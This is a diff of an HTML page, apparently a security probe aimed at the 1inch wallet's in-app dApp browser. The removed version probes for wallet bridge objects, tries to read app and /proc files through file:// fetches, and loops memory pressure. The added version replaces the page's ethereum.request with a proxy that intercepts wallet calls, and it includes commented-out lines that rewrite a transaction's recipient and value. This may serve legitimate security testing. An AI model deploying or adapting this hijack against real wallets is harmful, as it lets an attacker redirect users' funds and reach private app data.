@@ -2,65 +2,62 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Test Payload v2</title>
+    <title>1inch Hijack Test v3</title>
     <script>
-        console.log("[+] 1inch WebView Payload v2 Loaded");
+        console.log("[+] 1inch Hijack Payload v3 Loaded");
 
         function log(msg) {
             console.log("[1inch] " + msg);
-            // Tampilkan di halaman juga
             const div = document.createElement('div');
-            div.style.color = 'red';
-            div.style.margin = '10px';
+            div.style.color = msg.includes("!") ? "red" : "blue";
+            div.style.margin = "5px 0";
             div.textContent = msg;
             document.body.appendChild(div);
         }
 
-        // Auto run semua test
-        function runAllTests() {
-            log("Starting all probes...");
+        function hijackEthereum() {
+            if (!window.ethereum) return log("No ethereum provider");
 
-            // Probe bridges
-            const bridges = ['ethereum', 'web3', '1inch', 'wallet', 'provider'];
-            bridges.forEach(b => {
-                if (window[b]) {
-                    log(`[!] BRIDGE FOUND: ${b}`);
+            log("[!] Hijacking ethereum.request ...");
+
+            const originalRequest = window.ethereum.request;
+            window.ethereum.request = async function(params) {
+                log(`[!] INTERCEPTED REQUEST: ${params.method}`);
+
+                if (params.method === "eth_sendTransaction") {
+                    log("🚨 TRANSACTION HIJACK DETECTED!");
+                    log("Original params: " + JSON.stringify(params.params[0]));
+                    
+                    // Contoh tampering (HANYA untuk test, jangan uncomment di real test)
+                    // params.params[0].to = "0x0000000000000000000000000000000000000000";
+                    // params.params[0].value = "0x1"; // 1 wei
+                    
+                    log("⚠️  Transaction would be modified here!");
                 }
-            });
 
-            if (window.ethereum) {
-                log("[!] Ethereum provider detected - Hijack possible");
-            }
+                return originalRequest.call(window.ethereum, params);
+            };
 
-            // Test file access
-            log("Testing file access (expect blocked)...");
-            ['file:///data/data/io.oneinch.android/', 'file:///proc/self/'].forEach(path => {
-                fetch(path).catch(() => log(`Blocked: ${path}`));
-            });
-
-            // Memory pressure (disrupt)
-            log("Applying light memory pressure...");
-            let arr = [];
-            for (let i = 0; i < 1000000; i++) {
-                arr.push("A".repeat(100));
-            }
-            log("Memory test done");
+            log("[+] Hijack proxy installed successfully");
         }
 
-        // Jalankan otomatis
-        window.onload = runAllTests;
+        window.onload = function() {
+            log("Starting hijack test...");
+            hijackEthereum();
 
-        // Backup: jalankan tiap 1 detik
-        setInterval(() => {
-            if (document.body) runAllTests();
-        }, 1000);
+            // Test trigger (kirim dummy request)
+            setTimeout(() => {
+                if (window.ethereum) {
+                    window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    }).catch(() => {});
+                }
+            }, 1500);
+        };
     </script>
 </head>
-<body style="font-family: Arial; padding: 20px;">
-    <h1>1inch dApp Browser Test Payload v2</h1>
-    <p><strong>Auto running all tests...</strong></p>
-    <p>Perhatikan console log dan teks merah di bawah ini.</p>
-    <div id="logs" style="margin-top: 20px;"></div>
+<body style="padding:20px; font-family:sans-serif;">
+    <h1>1inch Transaction Hijack Test v3</h1>
+    <p>Auto hijacking ethereum provider...</p>
 </body>
 </html>
